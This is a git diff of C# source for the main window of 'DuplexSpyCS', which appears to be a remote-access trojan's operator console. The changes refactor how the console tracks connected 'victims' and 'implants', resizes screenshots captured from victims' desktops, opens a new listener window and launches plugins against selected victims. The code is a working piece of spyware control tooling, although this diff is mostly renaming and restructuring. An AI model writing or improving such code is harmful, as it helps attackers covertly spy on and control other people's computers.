@@ -9,7 +9,7 @@ using System.Text;
 
 namespace DuplexSpyCS
 {
-    public partial class Form1 : Form
+    public partial class frmMain : Form
     {
         public clsTcpListener listener;
 
@@ -26,8 +26,9 @@ namespace DuplexSpyCS
         public static Dictionary<string, clsFilePacketWriter> g_FilePacketWriter = new Dictionary<string, clsFilePacketWriter>();
 
         public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
+        public clsSqlConn m_sqlConn { get; set; }
 
-        public Form1()
+        public frmMain()
         {
             InitializeComponent();
         }
@@ -45,6 +46,10 @@ namespace DuplexSpyCS
             return lsVictim;
         }
 
+        /// <summary>
+        /// Get victims from listview1 and return List object.
+        /// </summary>
+        /// <returns>clsVictim in List.</returns>
         public List<clsVictim> GetAllVictim()
         {
             List<clsVictim> lsVictim = new List<clsVictim>();
@@ -179,7 +184,7 @@ namespace DuplexSpyCS
         /// <param name="v">Class Victim</param>
         /// <param name="buffer">Payload</param>
         /// <param name="rec">Buffer length</param>
-        void Received(clsTcpListener l, clsVictim v, string[] cmd)
+        public void fnReceived(clsListener l, clsVictim v, List<string> cmd)
         {
             try
             {
@@ -234,8 +239,9 @@ namespace DuplexSpyCS
                                 width = 255;
                             il_screen.ImageSize = new Size(width, width);
                             Image img = clsTools.Base64ToImage(cmd[10]);
-                            il_screen.Images.Add(v.ID, img);
-                            v.img_LastDesktop = img;
+                            Bitmap bmp = new Bitmap(img, new Size(width, width));
+                            il_screen.Images.Add(v.ID, bmp);
+                            v.img_LastDesktop = bmp;
 
                             Invoke(new Action(() =>
                             {
@@ -1383,24 +1389,24 @@ namespace DuplexSpyCS
             }
         }
 
-        private void fnImplantConnected(clsTcpListener l, clsVictim v, string[] aszMsg)
+        public void fnImplantConnected(clsListener l, clsVictim v, List<string> lsMsg)
         {
-            ListViewItem item = new ListViewItem(aszMsg[0]);
+            ListViewItem item = new ListViewItem(lsMsg[0]);
             item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
-            for (int i = 1; i < aszMsg.Length; i++)
-                item.SubItems.Add(aszMsg[i]);
+            for (int i = 1; i < lsMsg.Count; i++)
+                item.SubItems.Add(lsMsg[i]);
             item.Tag = v;
 
             Invoke(new Action(() =>
             {
-                if (listView2.FindItemWithText(aszMsg[0]) != null)
+                if (listView2.FindItemWithText(lsMsg[0]) != null)
                     return;
 
                 listView2.Items.Add(item);
             }));
         }
 
-        private void fnImplantDisconnected(clsVictim v)
+        public void fnImplantDisconnected(clsVictim v)
         {
             try
             {
@@ -1433,7 +1439,7 @@ namespace DuplexSpyCS
         /// Cutoff the selected socket.
         /// </summary>
         /// <param name="v"></param>
-        void Disconnected(clsVictim v)
+        public void fnDisconnected(clsVictim v)
         {
             v.socket.Close();
             clsStore.sql_conn.WriteSystemLogs($"[{clsTools.DateTimeStrEnglish()}]: Disconnected: {v.ID}");
@@ -1505,8 +1511,13 @@ namespace DuplexSpyCS
                 }
             }
 
-            clsStore.sql_conn = new SqlConn("data.db"); //Set database.
-            clsStore.sql_conn.Open();
+            m_sqlConn = new clsSqlConn("data.db"); //Set database.
+            m_sqlConn.Open();
+
+            timer1.Start();
+            timer2.Start();
+
+            clsStore.sql_conn = m_sqlConn;
 
             //todo: load listener
 
@@ -1518,10 +1529,10 @@ namespace DuplexSpyCS
 
             DateTime now = DateTime.Now;
             clsStore.dtStartUp = now;
-            clsStore.sql_conn.NewLogs(SqlConn.CSV.Server, SqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
+            clsStore.sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private void frmMain_Load(object sender, EventArgs e)
         {
             fnSetup();
         }
@@ -1549,6 +1560,7 @@ namespace DuplexSpyCS
         //LISTEN
         private void toolStripButton1_Click(object sender, EventArgs e)
         {
+            /*
             frmListen f = new frmListen();
             f.frmMain = this;
 
@@ -1572,6 +1584,11 @@ namespace DuplexSpyCS
 
                 listener.fnStart();
             }
+
+            */
+
+            frmListener f = new frmListener(m_sqlConn, this);
+            f.Show();
         }
 
         //BUILD
@@ -2145,12 +2162,17 @@ namespace DuplexSpyCS
         private void toolStripMenuItem44_Click(object sender, EventArgs e)
         {
             List<clsVictim> ls = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
-            
+
             foreach (var victim in ls)
             {
                 frmPlugin f = new frmPlugin(victim);
                 f.Show();
             }
+        }
+
+        private void toolStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
         }
     }
 }
